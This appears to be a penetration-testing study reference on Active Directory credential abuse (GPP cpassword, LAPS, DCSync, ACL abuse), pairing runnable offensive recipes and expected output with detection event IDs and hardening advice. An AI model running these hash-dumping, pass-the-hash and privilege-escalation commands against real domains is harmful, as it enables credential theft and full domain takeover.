## 1. Overview

Credential abuse covers the techniques that turn access (a domain user, a
foothold on a host, or an ACL edge) into usable credentials: passwords,
NTLM hashes, Kerberos keys, or certificates. This file covers the four
highest-yield families: GPP cpassword, LAPS abuse, DCSync, and ACL abuse.

**Why these attacks work:**

- Group Policy Preferences stored passwords with a publicly-known AES key
  in SYSVOL - readable by any domain user.
- LAPS passwords are readable by users with `ReadLAPSPassword` or
  `AllExtendedRights` on the computer object - often delegated too widely.
- DCSync requires only the `Replicating Directory Changes` and
  `Replicating Directory Changes All` rights on the domain root - often
  granted to Entra Connect, backup tools, or via ACL abuse.
- ACLs on AD objects grant non-obvious rights (GenericAll, WriteDacl,
  WriteOwner, ForceChangePassword, AddMember) that allow credential
  manipulation without cracking anything.

**Techniques at a glance:**

| Technique | Requires | Yields |
|-----------|----------|--------|
| GPP cpassword | Any domain user (SYSVOL read) | Local admin password (legacy) |
| LAPS abuse | `ReadLAPSPassword` on computer | Local admin password |
| DCSync | Replication rights on domain root | All domain hashes |
| ACL abuse | Specific ACL edges | Password reset, group membership, DCSync |

## 2. Reconnaissance / Enumeration

**Offensive - GPP cpassword:**

    # Search SYSVOL for cpassword entries
    find /mnt/sysvol -name "*.xml" | xargs grep -l "cpassword"

    # Or mount SYSVOL via smbclient
    smbclient //10.10.10.10/SYSVOL -U USER%PASS
    smb: \corp.local\Policies\> recurse ON
    smb: \corp.local\Policies\> prompt OFF
    smb: \corp.local\Policies\> mget *.xml

    # Search for cpassword in downloaded files
    grep -r "cpassword" .

**Offensive - LAPS:**

    # netexec: LAPS-readable computers
    netexec ldap 10.10.10.10 -u USER -p PASS -M laps

    # PowerView: LAPS-readable computers for the current user
    Get-DomainComputer | Where-Object { $_."ms-mcs-admpwd" } | Select dnshostname,ms-mcs-admpwd

    # Raw LDAP: find LAPS-readable computers
    ldapsearch -x -H ldap://10.10.10.10 -D "USER@corp.local" -w PASS \
      -b "dc=corp,dc=local" "(ms-Mcs-AdmPwd=*)" ms-Mcs-AdmPwd

**Offensive - DCSync rights:**

    # BloodHound: find users with DCSync rights
    # Query: "Find principals with DCSync rights"

    # PowerView: check ACL on domain root
    Get-DomainObjectAcl -Identity "DC=corp,DC=local" -ResolveGUIDs |
      Where-Object { $_.ObjectAceType -match "Replicating Directory Changes" }

    # Raw check: who has the two replication GUIDs
    # 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2 (Replicating Directory Changes)
    # 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2 (Replicating Directory Changes All)

**Offensive - ACL abuse:**

    # BloodHound: find all ACL edges from owned principals
    # Queries: "Shortest Paths from Owned Principals"

    # PowerView: enumerate ACLs on a specific target
    Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs

    # PowerView: find objects where a specific user has rights
    Get-DomainObjectAcl -Identity TARGET -ResolveGUIDs |
      Where-Object { $_.SecurityIdentifier -eq (Get-DomainUser USER).objectsid }

**Defensive - what to monitor:**

- SYSVOL file access from non-admin accounts (4663 on the file share).
- LAPS password reads (4662 with `ms-Mcs-AdmPwd` access).
- DCSync events (4662 with replication GUIDs).
- ACL modifications on sensitive objects (5136 - directory service object
  modification).
- Password resets on privileged accounts (4724).

## 3. Common Attack Vectors

**GPP cpassword (legacy):**

- Group Policy Preferences stored AES-encrypted passwords in `Groups.xml`,
  `Services.xml`, `ScheduledTasks.xml`, `DataSources.xml`, `Printers.xml`,
  `Drives.xml` in SYSVOL.
- The AES key is public: `4e 99 06 e8 fc b6 6c c9 fa f4 93 10 62 0f fe e8
  f4 96 e8 06 cc 05 79 90 20 9b 09 a4 33 b6 6c 1b`.
- Any domain user can read SYSVOL.

**LAPS abuse:**

- LAPS passwords are stored in the `ms-Mcs-AdmPwd` attribute of computer
  objects.
- Readable by users with `ReadLAPSPassword` or `AllExtendedRights` on the
  computer object.
- Often delegated to helpdesk or monitoring groups - a common escalation
  path.

**DCSync:**

- Requires `Replicating Directory Changes` + `Replicating Directory
  Changes All` on the domain root.
- Granted by default only to Domain Admins, Enterprise Admins, and the DC
  machine account.
- Often granted to Entra Connect (Azure AD Connect) sync account, backup
  tools (Veeam, Commvault), or via ACL abuse.

**ACL abuse - the useful edges:**

| ACL edge | Effect |
|----------|--------|
| GenericAll | Full control - set password, add to group, DCSync |
| GenericWrite | Write attributes - set SPN (Kerberoast), set logon script |
| WriteDacl | Modify ACL - grant yourself any right |
| WriteOwner | Change owner - then grant yourself any right |
| ForceChangePassword | Reset user password without knowing old |
| AddMember | Add yourself to a group |
| AddSelf | Add yourself to a group (self only) |
| AllExtendedRights | Includes ForceChangePassword |
| ReadLAPSPassword | Read LAPS password |
| DCSync | Replication rights |

**ACL chains:**

- BloodHound finds chains like `USER -> GenericAll -> GROUP -> member of -> DOMAIN ADMINS`.
- The shortest chain from a low-privileged user to Domain Admin is often
  2-4 edges.

## 4. Exploitation Recipes

**GPP cpassword end-to-end:**

    # 1. Find and download Groups.xml
    smbclient //10.10.10.10/SYSVOL -U USER%PASS
    smb: \corp.local\Policies\{GUID}\Machine\Preferences\Groups\> get Groups.xml

    # Expected content:
    # <Groups clsid="{...}">
    #   <User clsid="{...}" name="Administrator" ...>
    #     <Properties ... cpassword="<GPP_CPASSWORD>" .../>
    #   </User>
    # </Groups>

    # 2. Decrypt cpassword
    gpp-decrypt <GPP_CPASSWORD>

    # Expected output:
    # LocalAdminPassword2024!

**LAPS abuse end-to-end:**

    # netexec (with a user that has ReadLAPSPassword)
    netexec ldap 10.10.10.10 -u USER -p PASS -M laps

    # Expected output:
    # LDAP  10.10.10.10  389  DC01  [*] Windows Server 2019
    # LAPS  10.10.10.10  389  DC01  Computer: SRV01$  Password: <PASSWORD>  Expiration: ...

    # Use the password for local admin access
    netexec smb 10.10.10.10 -u Administrator -p <PASSWORD> --local-auth

**DCSync end-to-end:**

    # 1. With a user that has replication rights
    secretsdump.py corp.local/user:password@10.10.10.10

    # Expected output:
    # [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
    # Administrator:500:<LM_HASH_EMPTY>:<NTLM_HASH>:::
    # krbtgt:502:<LM_HASH_EMPTY>:<KRBTGT_HASH>:::

    # 2. Use the Administrator hash for PtH
    psexec.py -hashes <LM_HASH_EMPTY>:<NTLM_HASH> corp.local/Administrator@10.10.10.10

    # Expected output:
    # [*] Requesting shares on 10.10.10.10.....
    # [*] Found writable share ADMIN$
    # nt authority\system

**ACL abuse - GenericAll -> reset password:**

    # With GenericAll on a user object
    net rpc password TARGET_USER NewPassword123 -U CORP/USER%PASSWORD -S 10.10.10.10

    # Or with PowerView
    Set-DomainUserPassword -Identity TARGET_USER -AccountPassword (ConvertTo-SecureString "NewPassword123" -AsPlainText -Force)

    # Validate
    netexec smb 10.10.10.10 -u TARGET_USER -p NewPassword123

**ACL abuse - WriteDacl -> grant DCSync:**

    # PowerView: grant DCSync rights to yourself
    Add-DomainObjectAcl -TargetIdentity "DC=corp,DC=local" -PrincipalIdentity USER -Rights DCSync

    # Then run secretsdump
    secretsdump.py corp.local/user:password@10.10.10.10

**ACL abuse - AddMember -> add yourself to Domain Admins:**

    # PowerView
    Add-DomainGroupMember -Identity "Domain Admins" -Members USER

    # Or with net rpc
    net rpc group addmem "Domain Admins" USER -U CORP/USER%PASSWORD -S 10.10.10.10

    # Validate
    net rpc group members "Domain Admins" -U CORP/USER%PASSWORD -S 10.10.10.10

**ACL abuse - WriteOwner -> take ownership:**

    # PowerView: take ownership of a target
    Set-DomainObjectOwner -Identity TARGET -OwnerIdentity USER

    # Then grant yourself GenericAll
    Add-DomainObjectAcl -TargetIdentity TARGET -PrincipalIdentity USER -Rights All

## 5. Post-Exploitation

**After GPP cpassword:**

- The decrypted password is usually the local Administrator password on
  multiple hosts (legacy GPP deployments are often uniform).
- Test with `netexec smb 10.10.10.0/24 -u Administrator -p <PASSWORD> --local-auth`.
- If the password works on a DC, it may be the domain admin password
  (rare, but check).

**After LAPS abuse:**

- Use the password for local admin access on the target host.
- Dump LSASS on the host for more credentials.
- Check if the same LAPS password is reused on other hosts (rare with
  LAPS, but check the LAPS interval).

**After DCSync:**

- The dumped hashes are password-equivalent.
- Use the Administrator hash for PtH to any domain-joined host.
- Extract the KRBTGT hash for Golden Ticket persistence.
- Extract the DPAPI backup key for offline decryption of DPAPI blobs.

**After ACL abuse:**

- Mark the target as owned in BloodHound.
- Re-run "Shortest Paths from Owned Principals" - the graph changes.
- Chain ACL edges: GenericAll -> reset password -> authenticate as user
  -> more ACLs -> Domain Admin.

**Persistence:**

- Golden Ticket (KRBTGT hash) - valid until KRBTGT is rotated twice.
- Silver Ticket (service account hash) - valid for the specific service.
- AdminSDHolder ACL backdoor - reapplied by SDProp every 60 minutes.
- SID History injection (requires DA or forest trust).

## 6. Risk Context

Credential abuse is the phase where AD compromise becomes complete:

- GPP cpassword is legacy but still found in environments that have not
  cleaned SYSVOL since 2014.
- LAPS abuse turns a delegated helpdesk right into local admin on
  thousands of hosts.
- DCSync turns any user with replication rights into Domain Admin.
- ACL abuse turns a single misconfigured edge into a full domain takeover.

**Blast radius:** after DCSync, the entire domain is compromised. Hashes
are valid until the passwords change; Golden Tickets are valid until
KRBTGT is rotated twice.

**Why attacks succeed:**

- SYSVOL is readable by all domain users by design.
- LAPS permissions are often delegated to broad groups.
- DCSync rights are granted to non-admin accounts (Entra Connect, backup
  tools) by design.
- ACLs accumulate over years; nobody audits them.
- Password rotation after compromise is rare.

## 7. Root Causes

- **GPP cpassword remnants.** Group Policy Preferences was deprecated in
  2014 but the XML files remain in SYSVOL in many environments.
- **Over-delegated LAPS.** `ReadLAPSPassword` granted to Helpdesk,
  Monitoring, or via nested groups.
- **DCSync rights on non-admin accounts.** Entra Connect sync account,
  backup service accounts, and monitoring tools.
- **Unmanaged ACLs.** GenericAll, WriteDacl, WriteOwner granted during
  migrations or by mistake; never audited.
- **No password rotation after compromise.** Hashes remain valid
  indefinitely.
- **KRBTGT never rotated.** Golden Tickets remain valid forever.

## 8. Preventive Controls

**GPP cpassword:**

- Search SYSVOL for `cpassword` and delete the entries.
- Microsoft removed the ability to set passwords in GPP in 2014 (MS14-025).
- If GPP is still used, migrate to LAPS or gMSA.

**LAPS hardening:**

- Use Windows LAPS (built into Server 2019+ / Windows 10+).
- Audit `ReadLAPSPassword` delegation; restrict to Tier 2 admins only.
- Use LAPS with encryption (Windows LAPS supports password encryption).
- Rotate LAPS passwords frequently (default 30 days).

**DCSync hardening:**

- Audit replication rights on the domain root.
- Entra Connect account should have DCSync - document it, monitor it.
- Backup service accounts should NOT have DCSync; use the backup API
  instead.
- Monitor 4662 with replication GUIDs.

**ACL hardening:**

- Audit ACLs quarterly with BloodHound Enterprise or PingCastle.
- Remove GenericAll, WriteDacl, WriteOwner from non-admin principals.
- Use adminSDHolder to protect Tier 0 objects.
- Deploy tiered administration (Tier 0 / 1 / 2).

**General:**

- Rotate KRBTGT twice after any suspected compromise.
- Rotate all privileged account passwords after compromise.
- Enable Protected Users for all Tier 0 accounts.
- Monitor password resets on privileged accounts (4724).

## 9. Detection Controls

**GPP cpassword:**

- Event 4663 (file access) on SYSVOL `*.xml` files from non-admin accounts.
- Event 5145 (network share access) to `\\<dc>\SYSVOL\...\Policies\...\*.xml`.

**LAPS abuse:**

- Event 4662 (directory service access) with `ms-Mcs-AdmPwd` attribute read.
- Baseline: which accounts read LAPS passwords in normal operations.
- Alert on any new reader.

**DCSync:**

- Event 4662 with replication GUIDs:
  - `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` (Replicating Directory Changes)
  - `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2` (Replicating Directory Changes All)
- Alert on any account other than the DC machine account and the
  documented Entra Connect account.

**ACL abuse:**

- Event 5136 (directory service object modification) - any change to
  `nTSecurityDescriptor` on sensitive objects.
- Event 4724 (password reset attempt) on privileged accounts.
- Event 4728 / 4732 / 4756 (member added to a security group) for
  privileged groups.

**General:**

- Honeytokens: fake privileged accounts with realistic names and group
  memberships. Any authentication or ACL change on them is high-confidence.

## 10. Verification

**Offensive - did the attack succeed?**

- GPP cpassword: decrypted password validates with `netexec smb`.
- LAPS: password works for local admin access on the target host.
- DCSync: hashes dumped; validate with PtH.
- ACL abuse: the granted right is effective (password reset, group
  membership, DCSync works).

**Defensive - are controls effective?**

- Test GPP cpassword: SYSVOL contains no `cpassword` strings.
- Test LAPS: `ReadLAPSPassword` is granted only to Tier 2 admins;
  Helpdesk and Monitoring cannot read it.
- Test DCSync: only the DC machine account and the documented Entra
  Connect account have replication rights.
- Test ACL abuse: BloodHound shows no path from a low-privileged user to
  Domain Admin in < 5 edges.

## 11. OSCP Notes

- GPP cpassword (Active machine) is the classic OSCP foothold - practice
  the `smbclient` -> `gpp-decrypt` chain.
- DCSync is the classic OSCP privilege escalation after gaining
  replication rights (often via ACL abuse).
- ACL abuse (GenericAll, WriteDacl) is common in OSCP AD machines;
  practice with PowerView and BloodHound.
- **Capture screenshots** of:
  - The GPP cpassword file in SYSVOL.
  - The decrypted password.
  - The DCSync output showing Administrator's hash.
  - The ACL edge in BloodHound.
- The `> [!IMPORTANT]` OSCP reporting note applies to any command that
  proves credential abuse or privilege escalation.

## 12. Production Notes

- GPP cpassword is rare in modern environments (deprecated 2014); if
  found, it is usually a sign of an unmaintained legacy environment.
- LAPS abuse is common in environments with large helpdesk teams; audit
  delegation regularly.
- DCSync is the standard domain takeover technique; in mature
  environments, EDR flags `secretsdump` patterns within seconds.
- ACL abuse chains are environment-specific; BloodHound Enterprise is
  the standard defensive tool.
- Password rotation after compromise is the exception, not the rule -
  assume hashes remain valid.

## 13. References

**Microsoft documentation:**

- [Group Policy Preferences (deprecated)](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/dn581922(v=ws.11))
- [Windows LAPS overview](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview)
- [MS14-025: Vulnerability in Group Policy Preferences](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2014/ms14-025)
- [AdminSDHolder, Protected Admin Groups](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory)

**MITRE ATT&CK:**

- [Credential Access - OS Credential Dumping (T1003)](https://attack.mitre.org/techniques/T1003/)
- [Credential Access - Steal or Forge Kerberos Tickets (T1558)](https://attack.mitre.org/techniques/T1558/)
- [Privilege Escalation - Domain Policy Modification (T1484)](https://attack.mitre.org/techniques/T1484/)

**Tools:**

- [Impacket](https://github.com/fortra/impacket) - secretsdump, psexec, getTGT
- [netexec](https://github.com/Pennyw0rth/NetExec) - LAPS module
- [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) - ACL enumeration
- [BloodHound](https://github.com/BloodHoundAD/BloodHound) - ACL path analysis
- [gpp-decrypt](https://github.com/t0thkr1s/gpp-decrypt) - GPP cpassword decryption

**Research:**

- [ADSecurity.org - DCSync](https://adsecurity.org/?p=1729)
- [ADSecurity.org - GPP cpassword](https://adsecurity.org/?p=63)
- [The Hacker Recipes - ACL abuse](https://www.thehacker.recipes/ad/movement/dacl)